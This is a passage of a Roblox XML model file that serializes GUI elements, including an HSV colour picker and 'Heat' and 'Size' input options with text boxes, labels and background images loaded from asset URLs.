													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX76F19173E2C64275BCA2E499626EC353">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX4E691BDDEE134C2B996DF7CF34A7F2E7">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBXCBE972C6201D4D8E850EB6DF43DC617E">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBX0183718C6DAF4177B197E3D99064E148">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX7E884375488F4CBAA4A9308DA02BC04E">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXFA72FBEF87F94DAEBFA18BC7C96B1159">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXAF7E8DABB63E47E0B28B3C7571FF946D">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX6730D55CA7B94B5CB3C4F12047A567A2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">HeatOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>80</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX0295132B8AC140DDBC8B18DCFA35ADC4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Heat</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX194B75D705A4489091179396A8C2855B">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>34</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXAC6CD31C9EE643EBADF1BBC852A2A82C">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX9156B02EFE3C481AA7810B9BBFAC07CF">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX9F80B5D5F8BF4ED6863567577CD86B68">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX0007EE55BC5C4D1F858D59906C9BE3D8">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">1</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX877E3C9FE53542B495EB9D086EEA3D88">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SizeOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>90</XO>
												<YS>0</YS>
												<YO>80</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXD58150A4EF164D2F8D917E3B5414357A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Size</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXC404C0D830F84397B022A8EF48FB5ADA">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>30</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXC5553EA6C27149C1B611798F9EE219EE">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX6169BEEE9CD945569DEAF301673E7C1C">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX1ED235C07A994FF09CFF2337CC178F23">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
